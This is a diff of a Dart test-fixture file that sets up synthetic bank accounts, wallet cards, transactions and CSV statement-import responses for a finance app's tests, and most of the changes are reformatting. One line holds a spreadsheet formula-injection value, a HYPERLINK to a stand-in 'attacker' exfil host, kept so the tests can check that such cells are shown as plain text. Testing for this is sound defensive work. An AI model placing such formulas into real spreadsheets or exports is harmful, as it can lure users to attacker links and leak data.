@@ -112,7 +112,6 @@ const String transactionsNextCursor = 'a2V5c2V0OjIwMjYtMDctMTd8N2FjKy8wMDA=';
 /// render as the characters they are.
 const String adversarialFormulaCell =
     '=HYPERLINK("https://synthetic-attacker.invalid/exfil","OPEN ME")';
-
 /// Padded on both sides on purpose. Statements really do pad their columns,
 /// and NOTHING may trim a cell: a client that tidied one would be editing a
 /// financial record in the one place its owner cannot check.
@@ -152,18 +151,20 @@ Map<String, Object?> _page({
   bool hasMore = false,
   String? nextCursor,
   int limit = 50,
-}) => <String, Object?>{
-  'limit': limit,
-  'returned': returned,
-  'hasMore': hasMore,
-  'nextCursor': nextCursor,
-};
+}) =>
+    <String, Object?>{
+      'limit': limit,
+      'returned': returned,
+      'hasMore': hasMore,
+      'nextCursor': nextCursor,
+    };
 
-Map<String, Object?> _money(String minorUnits, String currency, int exponent) => <String, Object?>{
-  'minorUnits': minorUnits,
-  'currency': currency,
-  'exponent': exponent,
-};
+Map<String, Object?> _money(String minorUnits, String currency, int exponent) =>
+    <String, Object?>{
+      'minorUnits': minorUnits,
+      'currency': currency,
+      'exponent': exponent,
+    };
 
 /// The account link block. One value, and it is the honest one.
 const Map<String, Object?> _notLinked = <String, Object?>{
@@ -191,38 +192,39 @@ Map<String, Object?> institution({
   required String nameEn,
   required String nameAr,
   String status = 'ACTIVE',
-}) => <String, Object?>{
-  'institutionId': id,
-  'code': code,
-  'kind': kind,
-  'displayNameEn': nameEn,
-  'displayNameAr': nameAr,
-  'status': status,
-};
+}) =>
+    <String, Object?>{
+      'institutionId': id,
+      'code': code,
+      'kind': kind,
+      'displayNameEn': nameEn,
+      'displayNameAr': nameAr,
+      'status': status,
+    };
 
 Map<String, Object?> get harbourBank => institution(
-  id: harbourBankId,
-  code: 'SYNTHETIC_HARBOUR_BANK',
-  kind: 'BANK',
-  nameEn: harbourBankNameEn,
-  nameAr: harbourBankNameAr,
-);
+      id: harbourBankId,
+      code: 'SYNTHETIC_HARBOUR_BANK',
+      kind: 'BANK',
+      nameEn: harbourBankNameEn,
+      nameAr: harbourBankNameAr,
+    );
 
 Map<String, Object?> get meridianExchange => institution(
-  id: meridianExchangeId,
-  code: 'SYNTHETIC_MERIDIAN_EXCHANGE',
-  kind: 'EXCHANGE_HOUSE',
-  nameEn: meridianNameEn,
-  nameAr: meridianNameAr,
-);
+      id: meridianExchangeId,
+      code: 'SYNTHETIC_MERIDIAN_EXCHANGE',
+      kind: 'EXCHANGE_HOUSE',
+      nameEn: meridianNameEn,
+      nameAr: meridianNameAr,
+    );
 
 Map<String, Object?> get lanternWallet => institution(
-  id: lanternWalletId,
-  code: 'SYNTHETIC_LANTERN_WALLET',
-  kind: 'FINTECH_WALLET',
-  nameEn: lanternNameEn,
-  nameAr: lanternNameAr,
-);
+      id: lanternWalletId,
+      code: 'SYNTHETIC_LANTERN_WALLET',
+      kind: 'FINTECH_WALLET',
+      nameEn: lanternNameEn,
+      nameAr: lanternNameAr,
+    );
 
 Map<String, Object?> account({
   required String accountId,
@@ -238,69 +240,70 @@ Map<String, Object?> account({
   String? unlistedIssuerLabel,
   int exponent = 2,
   int version = 1,
-}) => <String, Object?>{
-  'accountId': accountId,
-  'accountType': accountType,
-  'walletKind': walletKind,
-  'nature': nature,
-  'currency': <String, Object?>{'code': currency, 'exponent': exponent},
-  'displayName': displayName,
-  'mask': mask,
-  'institution': issuer,
-  'userSuppliedInstitutionLabel': unlistedIssuerLabel,
-  'status': status,
-  'origin': origin,
-  'link': _notLinked,
-  'createdAt': '2026-01-05T09:15:00Z',
-  'updatedAt': '2026-07-01T11:30:00Z',
-  'version': version,
-};
+}) =>
+    <String, Object?>{
+      'accountId': accountId,
+      'accountType': accountType,
+      'walletKind': walletKind,
+      'nature': nature,
+      'currency': <String, Object?>{'code': currency, 'exponent': exponent},
+      'displayName': displayName,
+      'mask': mask,
+      'institution': issuer,
+      'userSuppliedInstitutionLabel': unlistedIssuerLabel,
+      'status': status,
+      'origin': origin,
+      'link': _notLinked,
+      'createdAt': '2026-01-05T09:15:00Z',
+      'updatedAt': '2026-07-01T11:30:00Z',
+      'version': version,
+    };
 
 /// The whole portfolio: three catalogue issuers, one of them a wallet
 /// provider, plus an issuer the person named themselves — and two currencies.
 List<Map<String, Object?>> get syntheticPortfolio => <Map<String, Object?>>[
-  account(
-    accountId: currentAccountId,
-    displayName: currentAccountName,
-    accountType: 'CURRENT',
-    currency: 'QAR',
-    mask: '**4417',
-    issuer: harbourBank,
-  ),
-  account(
-    accountId: savingsUsdAccountId,
-    displayName: savingsAccountName,
-    accountType: 'SAVINGS',
-    currency: 'USD',
-    mask: '**9032',
-    issuer: harbourBank,
-  ),
-  account(
-    accountId: cardAccountId,
-    displayName: cardAccountName,
-    accountType: 'CREDIT_CARD',
-    currency: 'QAR',
-    nature: 'LIABILITY',
-    origin: 'CSV',
-    mask: '**7781',
-    issuer: meridianExchange,
-  ),
-  account(
-    accountId: walletAccountId,
-    displayName: walletAccountName,
-    accountType: 'WALLET',
-    walletKind: 'MOBILE_MONEY',
-    currency: 'QAR',
-    issuer: lanternWallet,
-  ),
-  account(
-    accountId: unlistedIssuerAccountId,
-    displayName: unlistedAccountName,
-    accountType: 'CURRENT',
-    currency: 'QAR',
-    unlistedIssuerLabel: cornerSarrafaLabel,
-  ),
-];
+      account(
+        accountId: currentAccountId,
+        displayName: currentAccountName,
+        accountType: 'CURRENT',
+        currency: 'QAR',
+        mask: '**4417',
+        issuer: harbourBank,
+      ),
+      account(
+        accountId: savingsUsdAccountId,
+        displayName: savingsAccountName,
+        accountType: 'SAVINGS',
+        currency: 'USD',
+        mask: '**9032',
+        issuer: harbourBank,
+      ),
+      account(
+        accountId: cardAccountId,
+        displayName: cardAccountName,
+        accountType: 'CREDIT_CARD',
+        currency: 'QAR',
+        nature: 'LIABILITY',
+        origin: 'CSV',
+        mask: '**7781',
+        issuer: meridianExchange,
+      ),
+      account(
+        accountId: walletAccountId,
+        displayName: walletAccountName,
+        accountType: 'WALLET',
+        walletKind: 'MOBILE_MONEY',
+        currency: 'QAR',
+        issuer: lanternWallet,
+      ),
+      account(
+        accountId: unlistedIssuerAccountId,
+        displayName: unlistedAccountName,
+        accountType: 'CURRENT',
+        currency: 'QAR',
+        unlistedIssuerLabel: cornerSarrafaLabel,
+      ),
+    ];
 
 Map<String, Object?> balanceSnapshot({
   required String snapshotId,
@@ -309,16 +312,17 @@ Map<String, Object?> balanceSnapshot({
   required String balanceKind,
   String sourceKind = 'MANUAL',
   String asOf = '2026-07-01T00:00:00Z',
-}) => <String, Object?>{
-  'snapshotId': snapshotId,
-  'accountId': accountId,
-  'amount': amount,
-  'balanceKind': balanceKind,
-  'sourceKind': sourceKind,
-  'availability': 'EXECUTABLE',
-  'asOf': asOf,
-  'capturedAt': '2026-07-01T06:05:00Z',
-};
+}) =>
+    <String, Object?>{
+      'snapshotId': snapshotId,
+      'accountId': accountId,
+      'amount': amount,
+      'balanceKind': balanceKind,
+      'sourceKind': sourceKind,
+      'availability': 'EXECUTABLE',
+      'asOf': asOf,
+      'capturedAt': '2026-07-01T06:05:00Z',
+    };
 
 /// What the sources reported, per account. Two currencies, never added.
 Map<String, List<Map<String, Object?>>> get syntheticBalances =>
@@ -367,28 +371,34 @@ Map<String, List<Map<String, Object?>>> get syntheticBalances =>
 /// The source feeding the card account: a file the person uploaded, on the one
 /// rail that runs.
 Map<String, Object?> get cardSourceLink => <String, Object?>{
-  'sourceLinkId': sourceLinkId,
-  'accountId': cardAccountId,
-  'connectionId': connectionId,
-  'rail': 'USER_FILE_UPLOAD',
-  'availability': 'EXECUTABLE',
-  'sourceAuthority': 'AUTHORITATIVE',
-  'matchBasis': 'EXACT_EXTERNAL_REFERENCE',
-  'status': 'LINKED',
-  'link': _noInstitutionLink,
-  'subjectConfirmedAt': '2026-06-02T08:00:00Z',
-  'sourcePriority': 1,
-  'observation': <String, Object?>{
-    'firstObservedAt': '2026-06-01T08:00:00Z',
-    'lastObservedAt': '2026-07-31T08:00:00Z',
-    'lastSuccessfulImportAt': '2026-07-31T08:00:00Z',
-  },
-  'historyCoverage': <String, Object?>{'start': '2026-06-01', 'end': '2026-07-31'},
-  'capabilities': <String, Object?>{'balance': 'OBSERVED', 'pendingTransactions': 'NOT_PROVIDED'},
-  'createdAt': '2026-06-01T08:00:00Z',
-  'updatedAt': '2026-07-31T08:00:00Z',
-  'version': 3,
-};
+      'sourceLinkId': sourceLinkId,
+      'accountId': cardAccountId,
+      'connectionId': connectionId,
+      'rail': 'USER_FILE_UPLOAD',
+      'availability': 'EXECUTABLE',
+      'sourceAuthority': 'AUTHORITATIVE',
+      'matchBasis': 'EXACT_EXTERNAL_REFERENCE',
+      'status': 'LINKED',
+      'link': _noInstitutionLink,
+      'subjectConfirmedAt': '2026-06-02T08:00:00Z',
+      'sourcePriority': 1,
+      'observation': <String, Object?>{
+        'firstObservedAt': '2026-06-01T08:00:00Z',
+        'lastObservedAt': '2026-07-31T08:00:00Z',
+        'lastSuccessfulImportAt': '2026-07-31T08:00:00Z',
+      },
+      'historyCoverage': <String, Object?>{
+        'start': '2026-06-01',
+        'end': '2026-07-31',
+      },
+      'capabilities': <String, Object?>{
+        'balance': 'OBSERVED',
+        'pendingTransactions': 'NOT_PROVIDED',
+      },
+      'createdAt': '2026-06-01T08:00:00Z',
+      'updatedAt': '2026-07-31T08:00:00Z',
+      'version': 3,
+    };
 
 Map<String, Object?> instrument({
   required String instrumentId,
@@ -397,35 +407,36 @@ Map<String, Object?> instrument({
   String instrumentType = 'VIRTUAL_CARD',
   String status = 'ACTIVE',
   bool spendable = true,
-}) => <String, Object?>{
-  'instrumentId': instrumentId,
-  'accountId': walletAccountId,
-  'instrumentType': instrumentType,
-  'status': status,
-  'spendable': spendable,
-  'mask': mask,
-  'displayLabel': displayLabel,
-  'issuerLink': _noIssuerLink,
-  'createdAt': '2026-02-11T10:00:00Z',
-  'updatedAt': '2026-06-11T10:00:00Z',
-  'version': 1,
-};
+}) =>
+    <String, Object?>{
+      'instrumentId': instrumentId,
+      'accountId': walletAccountId,
+      'instrumentType': instrumentType,
+      'status': status,
+      'spendable': spendable,
+      'mask': mask,
+      'displayLabel': displayLabel,
+      'issuerLink': _noIssuerLink,
+      'createdAt': '2026-02-11T10:00:00Z',
+      'updatedAt': '2026-06-11T10:00:00Z',
+      'version': 1,
+    };
 
 /// TWO cards on ONE wallet. The wallet holds a balance; neither card does.
 List<Map<String, Object?>> get walletInstruments => <Map<String, Object?>>[
-  instrument(
-    instrumentId: walletCardOneId,
-    displayLabel: 'SYNTHETIC everyday card',
-    mask: '**1204',
-  ),
-  instrument(
-    instrumentId: walletCardTwoId,
-    displayLabel: 'SYNTHETIC subscriptions card',
-    mask: '**8890',
-    status: 'SUSPENDED',
-    spendable: false,
-  ),
-];
+      instrument(
+        instrumentId: walletCardOneId,
+        displayLabel: 'SYNTHETIC everyday card',
+        mask: '**1204',
+      ),
+      instrument(
+        instrumentId: walletCardTwoId,
+        displayLabel: 'SYNTHETIC subscriptions card',
+        mask: '**8890',
+        status: 'SUSPENDED',
+        spendable: false,
+      ),
+    ];
 
 Map<String, Object?> transaction({
   required String transactionId,
@@ -443,50 +454,51 @@ Map<String, Object?> transaction({
   String status = 'POSTED',
   int exponent = 2,
   int version = 1,
-}) => <String, Object?>{
-  'transactionId': transactionId,
-  'accountId': accountId,
-  'amount': _money(minorUnits, currency, exponent),
-  'direction': direction,
-  'bookingDate': bookingDate,
-  'valueDate': valueDate,
-  'eventOccurredAt': null,
-  'sourceTimezone': null,
-  'merchant': merchant,
-  'description': description,
-  'note': note,
-  'originalAmount': originalAmount,
-  'sourceKind': sourceKind,
-  'availability': 'EXECUTABLE',
-  'status': status,
-  'createdAt': '2026-07-19T05:00:00Z',
-  'version': version,
-};
+}) =>
+    <String, Object?>{
+      'transactionId': transactionId,
+      'accountId': accountId,
+      'amount': _money(minorUnits, currency, exponent),
+      'direction': direction,
+      'bookingDate': bookingDate,
+      'valueDate': valueDate,
+      'eventOccurredAt': null,
+      'sourceTimezone': null,
+      'merchant': merchant,
+      'description': description,
+      'note': note,
+      'originalAmount': originalAmount,
+      'sourceKind': sourceKind,
+      'availability': 'EXECUTABLE',
+      'status': status,
+      'createdAt': '2026-07-19T05:00:00Z',
+      'version': version,
+    };
 
 /// The first page: money out at one issuer, money out at another.
 List<Map<String, Object?>> get transactionsPageOne => <Map<String, Object?>>[
-  transaction(
-    transactionId: groceryTransactionId,
-    accountId: currentAccountId,
-    minorUnits: '-4500',
-    currency: 'QAR',
-    direction: 'MONEY_OUT',
-    bookingDate: '2026-07-18',
-    description: 'Card purchase',
-    merchant: groceryMerchant,
-    valueDate: '2026-07-19',
-  ),
-  transaction(
-    transactionId: tramTransactionId,
-    accountId: walletAccountId,
-    minorUnits: '-350',
-    currency: 'QAR',
-    direction: 'MONEY_OUT',
-    bookingDate: '2026-07-18',
-    description: 'Wallet payment',
-    merchant: tramMerchant,
-  ),
-];
+      transaction(
+        transactionId: groceryTransactionId,
+        accountId: currentAccountId,
+        minorUnits: '-4500',
+        currency: 'QAR',
+        direction: 'MONEY_OUT',
+        bookingDate: '2026-07-18',
+        description: 'Card purchase',
+        merchant: groceryMerchant,
+        valueDate: '2026-07-19',
+      ),
+      transaction(
+        transactionId: tramTransactionId,
+        accountId: walletAccountId,
+        minorUnits: '-350',
+        currency: 'QAR',
+        direction: 'MONEY_OUT',
+        bookingDate: '2026-07-18',
+        description: 'Wallet payment',
+        merchant: tramMerchant,
+      ),
+    ];
 
 /// The second page, reached only by following the platform's own cursor.
 ///
@@ -495,18 +507,18 @@ List<Map<String, Object?>> get transactionsPageOne => <Map<String, Object?>>[
 /// as two exact strings. Nothing converts one into the other, here or
 /// anywhere.
 List<Map<String, Object?>> get transactionsPageTwo => <Map<String, Object?>>[
-  transaction(
-    transactionId: salaryTransactionId,
-    accountId: savingsUsdAccountId,
-    minorUnits: '150000',
-    currency: 'USD',
-    direction: 'MONEY_IN',
-    bookingDate: '2026-07-17',
-    description: 'Transfer received',
-    originalAmount: _money('546000', 'QAR', 2),
-    version: 2,
-  ),
-];
+      transaction(
+        transactionId: salaryTransactionId,
+        accountId: savingsUsdAccountId,
+        minorUnits: '150000',
+        currency: 'USD',
+        direction: 'MONEY_IN',
+        bookingDate: '2026-07-17',
+        description: 'Transfer received',
+        originalAmount: _money('546000', 'QAR', 2),
+        version: 2,
+      ),
+    ];
 
 /// The transaction the person opens, with its history and its category.
 Map<String, Object?> get groceryTransactionDetail {
@@ -522,7 +534,10 @@ Map<String, Object?> get groceryTransactionDetail {
     valueDate: '2026-07-19',
     version: 2,
   );
-  Map<String, Object?> values({required String minorUnits, required String? merchant}) =>
+  Map<String, Object?> values({
+    required String minorUnits,
+    required String? merchant,
+  }) =>
       <String, Object?>{
         'amount': _money(minorUnits, 'QAR', 2),
         'direction': 'MONEY_OUT',
@@ -580,28 +595,29 @@ Map<String, Object?> statementImportView({
   Map<String, Object?>? statedBalance,
   String? refusalCode,
   String? committedAt,
-}) => <String, Object?>{
-  'importId': statementImportId,
-  'accountId': cardAccountId,
-  'connectionId': null,
-  'state': state,
-  'stateChangedAt': '2026-08-01T09:00:00Z',
-  'mediaType': 'text/csv',
-  'rail': 'USER_FILE_UPLOAD',
-  'availability': 'EXECUTABLE',
-  'hasStoredSource': hasStoredSource,
-  'retentionState': 'DECIDED',
-  'versions': versions,
-  'counts': counts ?? importCounts(),
-  'reconciliationStatus': reconciliation,
-  'statedBalance': statedBalance,
-  'refusalCode': refusalCode,
-  'awaitsDecision': awaitsDecision,
-  'committedAt': committedAt,
-  'erasedAt': null,
-  'createdAt': '2026-08-01T09:00:00Z',
-  'version': version,
-};
+}) =>
+    <String, Object?>{
+      'importId': statementImportId,
+      'accountId': cardAccountId,
+      'connectionId': null,
+      'state': state,
+      'stateChangedAt': '2026-08-01T09:00:00Z',
+      'mediaType': 'text/csv',
+      'rail': 'USER_FILE_UPLOAD',
+      'availability': 'EXECUTABLE',
+      'hasStoredSource': hasStoredSource,
+      'retentionState': 'DECIDED',
+      'versions': versions,
+      'counts': counts ?? importCounts(),
+      'reconciliationStatus': reconciliation,
+      'statedBalance': statedBalance,
+      'refusalCode': refusalCode,
+      'awaitsDecision': awaitsDecision,
+      'committedAt': committedAt,
+      'erasedAt': null,
+      'createdAt': '2026-08-01T09:00:00Z',
+      'version': version,
+    };
 
 Map<String, Object?> importCounts({
   int rowCount = 0,
@@ -609,16 +625,17 @@ Map<String, Object?> importCounts({
   int invalidRowCount = 0,
   int exactDuplicateCount = 0,
   int committedTransactionCount = 0,
-}) => <String, Object?>{
-  'rowCount': rowCount,
-  'validRowCount': validRowCount,
-  'invalidRowCount': invalidRowCount,
-  'exactDuplicateCount': exactDuplicateCount,
-  // Present and zero: probable-duplicate detection is not implemented, and
-  // a field that quietly did not exist would read as "none found".
-  'probableDuplicateCount': 0,
-  'committedTransactionCount': committedTransactionCount,
-};
+}) =>
+    <String, Object?>{
+      'rowCount': rowCount,
+      'validRowCount': validRowCount,
+      'invalidRowCount': invalidRowCount,
+      'exactDuplicateCount': exactDuplicateCount,
+      // Present and zero: probable-duplicate detection is not implemented, and
+      // a field that quietly did not exist would read as "none found".
+      'probableDuplicateCount': 0,
+      'committedTransactionCount': committedTransactionCount,
+    };
 
 const Map<String, Object?> processingVersions = <String, Object?>{
   'parserVersion': 'parser-3',
@@ -629,14 +646,21 @@ const Map<String, Object?> processingVersions = <String, Object?>{
 };
 
 /// Three data rows: two the platform accepted, one it refused.
-Map<String, Object?> get parsedCounts =>
-    importCounts(rowCount: 3, validRowCount: 2, invalidRowCount: 1);
+Map<String, Object?> get parsedCounts => importCounts(
+      rowCount: 3,
+      validRowCount: 2,
+      invalidRowCount: 1,
+    );
 
 /// The one refused row, as the contract permits it to be described: a 1-based
 /// DATA row number, one field from a closed vocabulary and one reason code.
 /// No cell, no header text, no amount.
 const List<Map<String, Object?>> refusedRows = <Map<String, Object?>>[
-  <String, Object?>{'rowNumber': 3, 'safeField': 'AMOUNT', 'reasonCode': 'UNREADABLE_AMOUNT'},
+  <String, Object?>{
+    'rowNumber': 3,
+    'safeField': 'AMOUNT',
+    'reasonCode': 'UNREADABLE_AMOUNT',
+  },
 ];
 
 // ---------------------------------------------------------------------------
@@ -656,7 +680,8 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     'page': _page(returned: syntheticPortfolio.length),
   });
 
-  platform.on('GET', '/financial/accounts/{accountId}', (RecordedRequest request, int _) {
+  platform.on('GET', '/financial/accounts/{accountId}',
+      (RecordedRequest request, int _) {
     final id = request.path.split('/').last;
     for (final held in syntheticPortfolio) {
       if (held['accountId'] == id) {
@@ -671,7 +696,8 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     });
   });
 
-  platform.on('GET', '/financial/accounts/{accountId}/balances', (RecordedRequest request, int _) {
+  platform.on('GET', '/financial/accounts/{accountId}/balances',
+      (RecordedRequest request, int _) {
     final id = request.path.split('/')[3];
     final held = syntheticBalances[id] ?? const <Map<String, Object?>>[];
     return ScriptedReply(200, <String, Object?>{
@@ -680,10 +706,8 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     });
   });
 
-  platform.on('GET', '/financial/accounts/{accountId}/source-links', (
-    RecordedRequest request,
-    int _,
-  ) {
+  platform.on('GET', '/financial/accounts/{accountId}/source-links',
+      (RecordedRequest request, int _) {
     final id = request.path.split('/')[3];
     final held = id == cardAccountId
         ? <Map<String, Object?>>[cardSourceLink]
@@ -694,12 +718,12 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     });
   });
 
-  platform.on('GET', '/financial/accounts/{accountId}/payment-instruments', (
-    RecordedRequest request,
-    int _,
-  ) {
+  platform.on('GET', '/financial/accounts/{accountId}/payment-instruments',
+      (RecordedRequest request, int _) {
     final id = request.path.split('/')[3];
-    final held = id == walletAccountId ? walletInstruments : const <Map<String, Object?>>[];
+    final held = id == walletAccountId
+        ? walletInstruments
+        : const <Map<String, Object?>>[];
     return ScriptedReply(200, <String, Object?>{
       'items': held,
       'page': _page(returned: held.length),
@@ -712,7 +736,10 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     if (accountId != null) {
       // The account detail screen's own narrower read.
       final held = <Map<String, Object?>>[
-        for (final row in <Map<String, Object?>>[...transactionsPageOne, ...transactionsPageTwo])
+        for (final row in <Map<String, Object?>>[
+          ...transactionsPageOne,
+          ...transactionsPageTwo,
+        ])
           if (row['accountId'] == accountId) row,
       ];
       return ScriptedReply(200, <String, Object?>{
@@ -747,7 +774,12 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     });
   });
 
-  platform.answer('GET', '/financial/transactions/{transactionId}', 200, groceryTransactionDetail);
+  platform.answer(
+    'GET',
+    '/financial/transactions/{transactionId}',
+    200,
+    groceryTransactionDetail,
+  );
 
   platform.answer(
     'POST',
@@ -760,7 +792,11 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     'POST',
     '/financial/statement-imports/{importId}/source',
     200,
-    statementImportView(state: 'SOURCE_STORED', version: 2, hasStoredSource: true),
+    statementImportView(
+      state: 'SOURCE_STORED',
+      version: 2,
+      hasStoredSource: true,
+    ),
   );
 
   platform.answer(
@@ -783,35 +819,50 @@ void installSyntheticWorld(SyntheticPlatform platform) {
     ),
   );
 
-  platform.answer('GET', '/financial/statement-imports/{importId}/preview', 200, <String, Object?>{
-    'importId': statementImportId,
-    'state': 'REVIEW_REQUIRED',
-    'accountId': cardAccountId,
-    'connectionId': null,
-    'hasStoredSource': true,
-    'counts': parsedCounts,
-    'reconciliationStatus': 'MATCHED',
-    'versions': processingVersions,
-    'refusalCode': null,
-    'awaitsDecision': true,
-    'reportedErrorCount': 1,
-    'totalErrorCount': 1,
-    'rowErrors': refusedRows,
-    'page': _page(returned: 1),
-  });
+  platform.answer(
+    'GET',
+    '/financial/statement-imports/{importId}/preview',
+    200,
+    <String, Object?>{
+      'importId': statementImportId,
+      'state': 'REVIEW_REQUIRED',
+      'accountId': cardAccountId,
+      'connectionId': null,
+      'hasStoredSource': true,
+      'counts': parsedCounts,
+      'reconciliationStatus': 'MATCHED',
+      'versions': processingVersions,
+      'refusalCode': null,
+      'awaitsDecision': true,
+      'reportedErrorCount': 1,
+      'totalErrorCount': 1,
+      'rowErrors': refusedRows,
+      'page': _page(returned: 1),
+    },
+  );
 
-  platform.answer('POST', '/financial/statement-imports/{importId}/commit', 200, <String, Object?>{
-    'importId': statementImportId,
-    'committedTransactionCount': 2,
-    'alreadyCommitted': false,
-    'transactionIds': <String>[importedTransactionId, groceryTransactionId],
-  });
+  platform.answer(
+    'POST',
+    '/financial/statement-imports/{importId}/commit',
+    200,
+    <String, Object?>{
+      'importId': statementImportId,
+      'committedTransactionCount': 2,
+      'alreadyCommitted': false,
+      'transactionIds': <String>[importedTransactionId, groceryTransactionId],
+    },
+  );
 }
 
 /// The client-safe bootstrap answer, with the financial capability available.
-Map<String, Object?> bootstrapContext({String transactionsCapabilityStatus = 'AVAILABLE'}) =>
+Map<String, Object?> bootstrapContext({
+  String transactionsCapabilityStatus = 'AVAILABLE',
+}) =>
     <String, Object?>{
-      'user': <String, Object?>{'userId': syntheticUserId, 'emailVerified': true},
+      'user': <String, Object?>{
+        'userId': syntheticUserId,
+        'emailVerified': true,
+      },
       'session': <String, Object?>{'sessionId': syntheticSessionId},
       'binding': <String, Object?>{
         'kind': 'BOUND',
